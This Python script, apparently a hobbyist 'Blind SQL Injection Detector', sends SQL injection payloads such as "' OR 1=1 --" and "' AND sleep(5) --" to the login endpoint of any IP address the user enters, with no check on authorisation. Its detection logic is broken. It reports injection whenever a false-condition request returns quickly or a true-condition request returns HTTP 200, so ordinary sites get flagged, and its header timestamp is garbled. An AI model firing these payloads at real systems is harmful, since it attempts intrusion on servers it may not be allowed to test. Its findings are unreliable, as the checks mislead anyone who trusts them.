# -*- coding: utf-8 -*-
"""
Created on Fri Feb  21 03:345:47 2025

@author: IAN CARTER KULANI

"""

from colorama import Fore
import pyfiglet
import os
font=pyfiglet.figlet_format("BLIND SQL INJECTION DETECTOR")
print(Fore.GREEN+font)

import requests
import time

# Function to check for Blind SQL Injection patterns by analyzing response time (time-based blind SQLi)
def detect_blind_sql_injection(ip_address):
    print(f"Checking for potential Blind SQL Injection on {ip_address}...")

    # SQL injection payloads (commonly used for Blind SQL Injection testing)
    payloads = [
        "' AND 1=1 --",  # Basic Blind SQLi payload
        "' AND 1=2 --",  # False condition to detect timing difference
        "' OR 1=1 --",   # Common Blind SQLi payload
        "' OR 1=2 --",   # False condition for time delay detection
        "' AND sleep(5) --",  # Time-based Blind SQLi (sleep for 5 seconds)
    ]
    
    # Target URL for testing, assuming there's a login or query endpoint
    url = f"http://{ip_address}/login"  # Adjust this based on the target app

    for payload in payloads:
        try:
            # Measure the time for each request with the payload
            data = {'username': payload, 'password': 'password'}
            
            # Start the timer for measuring response time
            start_time = time.time()
            response = requests.post(url, data=data)
            end_time = time.time()

            # Calculate response time (in seconds)
            response_time = end_time - start_time

            # Detect timing-based Blind SQL Injection by checking for delay
            if "sleep(5)" in payload and response_time >= 5:
                print(f"[!] Blind SQL Injection detected (Time-based) with payload: {payload}")
                print(f"Response time: {response_time:.2f} seconds")
            elif payload == "' AND 1=2 --" and response_time < 1:  # Check for difference in response time
                print(f"[!] Blind SQL Injection detected (Boolean-based) with payload: {payload}")
                print(f"Response time: {response_time:.2f} seconds")
            elif payload == "' AND 1=1 --" and response.status_code == 200:
                print(f"[!] Potential Blind SQL Injection detected with payload: {payload}")
                print(f"Response code: {response.status_code}")
                
        except requests.exceptions.RequestException as e:
            print(f"[!] Error making request: {e}")

# Main function
def main():
        
    # Prompt the user for an IP address to test for Blind SQL Injection
    ip_address = input("Enter the target IP address:")
    
    # Start detecting Blind SQL Injection attempts
    detect_blind_sql_injection(ip_address)

if __name__ == "__main__":
    main()
